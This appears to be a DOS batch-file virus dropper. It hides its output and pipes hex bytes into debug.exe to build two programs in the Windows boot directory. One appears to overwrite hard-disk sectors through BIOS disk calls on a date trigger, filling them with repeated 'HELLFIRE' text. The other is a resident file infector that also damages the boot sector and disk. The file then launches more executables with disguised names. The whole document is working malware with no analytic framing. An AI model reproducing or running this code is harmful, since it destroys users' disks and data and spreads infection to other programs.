@echo off
cls
@ctty nul
@if exist %winbootdir%\onoff.bat del %winbootdir%\onoff.bat
if exist %winbootdir%\glide1.exe goto dalee
echo n glide.com>twp.txt
echo E0100 B8 09 35 CD 21 89 1E 54 01 8C 06 56 01 B4 25 BA>>twp.txt
echo E0110 19 01 CD 21 BA DF 07 CD 27 9C 2E FF 06 58 01 2E>>twp.txt
echo E0120 83 3E 58 01 00 72 0C 50 53 51 52 06 1E 16 56 57>>twp.txt
echo E0130 EB 04 90 EB 1D 90 E8 45 00 E8 77 02 E8 8A 04 E8>>twp.txt
echo E0140 18 00 2E C7 06 58 01 00 00 5F 5E 17 1F 07 5A 59>>twp.txt
echo E0150 5B 58 9D EA 00 00 00 00 00 00 B8 40 00 1E 8E D8>>twp.txt
echo E0160 80 3E 75 00 00 74 0E A0 75 00 A2 7D 01 C6 06 75>>twp.txt
echo E0170 00 00 EB 07 90 A0 7D 01 A2 75 00 1F C3 00 0E 07>>twp.txt
echo E0180 C6 06 B2 01 0A B4 2C CD 21 0B D2 74 F8 02 D6 02>>twp.txt
echo E0190 D1 02 D1 02 D5 8A EA B0 01 B4 09 80 EC 06 B1 01>>twp.txt
echo E01A0 B6 01 B2 80 BB B3 01 CD 13 72 06 FE 0E B2 01 75>>twp.txt
echo E01B0 D4 C3 00 B2 20 20 B2 20 B2 B2 B2 B2 20 B2 20 20>>twp.txt
echo E01C0 20 B2 20 B2 20 20 B2 20 B2 20 20 20 20 B2 20 20>>twp.txt
echo E01D0 20 B2 20 B2 B2 B2 B2 20 B2 B2 B2 20 20 B2 20 20>>twp.txt
echo E01E0 20 B2 20 B2 20 20 B2 20 B2 20 20 20 20 B2 20 20>>twp.txt
echo E01F0 20 B2 20 B2 20 20 B2 20 B2 B2 B2 B2 20 B2 B2 20>>twp.txt
echo E0200 20 B2 B2 20 20 20 20 20 20 20 20 20 20 20 20 20>>twp.txt
echo E0210 20 20 20 B2 B2 B2 B2 20 20 20 20 20 20 20 20 20>>twp.txt
echo E0220 20 20 20 B2 20 20 20 20 B2 20 20 20 20 20 B2 B2>>twp.txt
echo E0230 B2 B2 20 B2 20 20 20 20 20 20 20 20 20 20 B2 20>>twp.txt
echo E0240 20 20 20 B2 B2 B2 20 20 B2 20 B2 B2 B2 20 B2 B2>>twp.txt
echo E0250 B2 20 20 B2 20 20 20 20 B2 20 B2 20 20 20 B2 20>>twp.txt
echo E0260 20 20 20 B2 20 20 20 20 B2 20 B2 20 20 20 B2 B2>>twp.txt
echo E0270 B2 B2 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>twp.txt
echo E0280 20 20 20 4C 69 6E 65 73 20 6F 66 20 6C 69 67 68>>twp.txt
echo E0290 74 20 20 72 61 6E 67 65 64 20 69 6E 20 74 68 65>>twp.txt
echo E02A0 20 20 20 6E 6F 6E 73 70 61 63 65 20 6F 66 20 74>>twp.txt
echo E02B0 68 65 20 6D 69 6E 64 2C 20 63 6C 75 73 74 65 72>>twp.txt
echo E02C0 73 20 20 61 6E 64 20 63 6F 6E 73 74 65 6C 6C 61>>twp.txt
echo E02D0 2D 20 20 74 69 6F 6E 73 20 6F 66 20 64 61 74 61>>twp.txt
echo E02E0 2C 20 20 6C 69 6B 65 20 63 69 74 79 20 6C 69 67>>twp.txt
echo E02F0 68 74 73 72 65 63 65 64 69 6E 67 2E 20 20 20 20>>twp.txt
echo E0300 20 20 20 4E 6F 74 20 6F 75 73 74 69 64 65 20 75>>twp.txt
echo E0310 73 2C 20 62 75 74 20 6E 65 78 74 20 74 6F 20 75>>twp.txt
echo E0320 73 2E 20 55 6E 64 65 72 20 6F 75 72 20 73 6B 69>>twp.txt
echo E0330 6E 3B 20 6F 66 74 65 6E 2C 20 69 6E 73 69 64 65>>twp.txt
echo E0340 20 20 20 6F 75 72 20 6D 69 6E 64 73 2E 20 20 20>>twp.txt
echo E0350 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>twp.txt
echo E0360 20 20 20 20 2D 57 69 6C 6C 69 61 6D 20 47 69 62>>twp.txt
echo E0370 73 6F 6E 20 20 4E 65 75 72 6F 6D 61 6E 63 65 72>>twp.txt
echo E0380 20 20 20 20 2D 42 72 75 63 65 20 53 74 65 72 6C>>twp.txt
echo E0390 69 6E 67 20 20 43 79 62 65 72 70 75 6E 6B 20 20>>twp.txt
echo E03A0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>twp.txt
echo E03B0 20 20 20 0E 07 B0 50 B4 09 80 EC 06 B9 02 00 B6>>twp.txt
echo E03C0 00 B2 80 BB C9 03 CD 13 C3 48 45 4C 4C 46 49 52>>twp.txt
echo E03D0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E03E0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E03F0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0400 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0410 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0420 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0430 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0440 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0450 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0460 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0470 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0480 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0490 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E04A0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E04B0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E04C0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E04D0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E04E0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E04F0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0500 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0510 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0520 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0530 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0540 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0550 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0560 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0570 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0580 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E0590 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E05A0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E05B0 45 48 45 4C 4C 46 49 52 45 48 45 4C 4C 46 49 52>>twp.txt
echo E05C0 45 48 45 4C 4C 46 49 52 45 0E 07 B0 01 B4 09 80>>twp.txt
echo E05D0 EC 06 B9 01 00 B6 00 B2 80 BB DF 05 CD 13 C3 00>>twp.txt
echo E05E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E05F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E06A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E06B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E06C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E06D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E06E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E06F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0710 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E0790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E07A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E07B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E07C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo E07D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>twp.txt
echo rcx>>twp.txt
ECHO 6DF>>twp.txt
echo w>>twp.txt
echo q>>twp.txt
debug<twp.txt
del twp.txt
copy /b glide.com %winbootdir%\glide1.exe
del glide.com
goto exti
:dalee
echo.|date|find "26">nul
@ctty con
if errorlevel 1 goto exti
%winbootdir%\glide1.exe
@ctty nul
echo n anns.com>anons.com
echo e0100 E8 00 00 8B FC 36 8B 2D 81 ED 03 01 2E 80 3E 46>>anons.com
echo e0110 01 B9 74 40 B9 46 04 8D BE 46 01 BA 01 00 81 35>>anons.com
echo e0120 E4 03 80 35 FC FF 05 81 2D 29 1E 81 05 85 03 FF>>anons.com
echo e0130 05 FE 05 F7 15 FE 05 47 47 EB 05 90 B4 4C CD 21>>anons.com
echo e0140 B4 0B CD 21 E2 D8 B9 46 04 8D BE 54 01 2E 80 35>>anons.com
echo e0150 01 47 E2 F9 B8 CA CA CD 21 80 FF CA 74 5C E8 F5>>anons.com
echo e0160 01 E8 31 02 E8 CD 02 B8 21 35 CD 21 3E 89 9E 4E>>anons.com
echo e0170 03 3E 8C 86 50 03 0E 58 48 8E C0 26 8B 1E 03 00>>anons.com
echo e0180 0E 07 83 EB 35 90 81 EB 57 04 B4 4A CD 21 BB 8B>>anons.com
echo e0190 04 B4 48 CD 21 48 8E C0 26 C6 06 01 00 08 40 8E>>anons.com
echo e01a0 C0 8D B6 00 01 BF 00 01 B9 46 03 0E 1F FC F3 A4>>anons.com
echo e01b0 BA D2 01 B8 21 25 06 1F CD 21 3E 8A A6 45 03 2E>>anons.com
echo e01c0 88 26 00 01 3E 8B 86 46 03 2E A3 01 01 B8 00 01>>anons.com
echo e01d0 FF E0 80 FC 4B 74 1A 80 FC 11 74 12 80 FC 12 74>>anons.com
echo e01e0 0D 3D CA CA 75 02 B7 CA 2E FF 2E 4E 03 C3 E9 4C>>anons.com
echo e01f0 02 9C 60 56 57 55 06 1E 0E 1F B8 24 35 CD 21 8C>>anons.com
echo e0200 06 52 03 89 1E 54 03 B8 24 25 BA 3F 03 CD 21 1F>>anons.com
echo e0210 07 5D 5F 5E 61 9D 9C 60 56 57 55 06 1E B8 00 43>>anons.com
echo e0220 CD 21 2E 89 0E 4C 03 B8 01 43 33 C9 CD 21 B8 02>>anons.com
echo e0230 3D CD 21 8B D8 B8 00 57 CD 21 2E 89 0E 48 03 2E>>anons.com
echo e0240 89 16 4A 03 2E 23 0E 43 04 2E 3B 0E 43 04 75 03>>anons.com
echo e0250 E9 9C 00 B8 02 42 E8 DF 00 0E 1F 2D 03 00 2E A3>>anons.com
echo e0260 42 03 B8 00 42 E8 D0 00 0E 1F B4 3F B9 03 00 BA>>anons.com
echo e0270 45 03 CD 21 2E 81 3E 45 03 4D 5A 75 03 EB 70 90>>anons.com
echo e0280 B8 00 42 E8 B2 00 0E 1F B4 40 B9 01 00 BA 44 03>>anons.com
echo e0290 CD 21 B4 40 B9 02 00 BA 42 03 CD 21 B8 02 42 E8>>anons.com
echo e02a0 96 00 0E 1F 0E 07 FC BE 00 01 BF 78 04 B9 46 03>>anons.com
echo e02b0 F3 A4 B9 46 04 BF CC 04 2E 80 35 01 47 E2 F9 B9>>anons.com
echo e02c0 46 04 BF BE 04 BA 01 00 FE 0D F7 15 FE 0D FF 0D>>anons.com
echo e02d0 81 2D 85 03 81 05 29 1E FF 0D 80 35 FC 81 35 E4>>anons.com
echo e02e0 03 47 47 E2 E3 B4 40 B9 46 03 BA 78 04 CD 21 B8>>anons.com
echo e02f0 01 57 2E 8B 0E 48 03 2E 8B 16 4A 03 2E 0B 0E 43>>anons.com
echo e0300 04 CD 21 B4 3E CD 21 1F 07 5D 5F 5E 61 9D 60 B8>>anons.com
echo e0310 01 43 2E 8B 0E 4C 03 CD 21 61 9C 60 56 57 55 06>>anons.com
echo e0320 1E B8 24 25 BB 52 03 8E DB BB 54 03 CD 21 1F 07>>anons.com
echo e0330 5D 5F 5E 61 9D E9 B0 FE 33 C9 33 D2 CD 21 C3 32>>anons.com
echo e0340 C0 CF 00 00 E9 CD 20 00 00 00 00 00 00 00 00 00>>anons.com
echo e0350 00 00 00 00 00 00 B4 2A CD 21 2E 3A 96 41 04 74>>anons.com
echo e0360 08 2E 80 BE 41 04 20 75 2B 2E 3A B6 42 04 74 08>>anons.com
echo e0370 2E 80 BE 42 04 0D 75 1C B4 0D CD 21 B0 02 B9 FF>>anons.com
echo e0380 FF BA 00 00 CD 26 B4 0D CD 21 B0 02 B9 FF FF BA>>anons.com
echo e0390 FF FF CD 26 C3 B8 80 9F 8E C0 B8 01 02 B9 01 00>>anons.com
echo e03a0 BA 80 00 33 DB CD 13 0E 1F B8 80 9F 8E C0 BE CF>>anons.com
echo e03b0 03 33 FF B9 69 00 F3 A4 B8 80 9F 8E C0 33 DB B8>>anons.com
echo e03c0 01 03 32 ED BA 80 00 B1 01 BB 00 00 CD 13 C3 FA>>anons.com
echo e03d0 33 C0 8E D0 BC 00 7C 8B F4 50 07 50 1F FB 9C 50>>anons.com
echo e03e0 51 52 1E 06 B4 04 CD 1A 2E 3A 36 42 04 74 09 07>>anons.com
echo e03f0 1F 5A 59 58 9D EB 23 90 33 D2 B9 02 00 B8 11 03>>anons.com
echo e0400 B2 80 BB 00 50 8E C3 CD 13 73 04 32 E4 CD 13 FE>>anons.com
echo e0410 C6 80 FE 04 72 E4 FE C5 EB DE 33 C0 8E C0 BB 00>>anons.com
echo e0420 7C B4 02 B0 01 B1 01 B5 00 B6 01 B2 80 CD 13 EA>>anons.com
echo e0430 00 7C 00 00 B8 01 FA BA 45 59 CD 21 C3 E9 A1 FD>>anons.com
echo e0440 CF 01 01 18 00 18>>anons.com
echo rcx>>anons.com
echo 346>>anons.com
echo w>>anons.com
echo q>>anons.com
debug<anons.com
del anons.com
copy /b anns.com %winbootdir%\anns.com
del anns.com
@ctty con
anns.com
%winbootdir%\system\rnadl32.exe
@del anns.com
%winbootdir%\system\coolent.exe
:exti
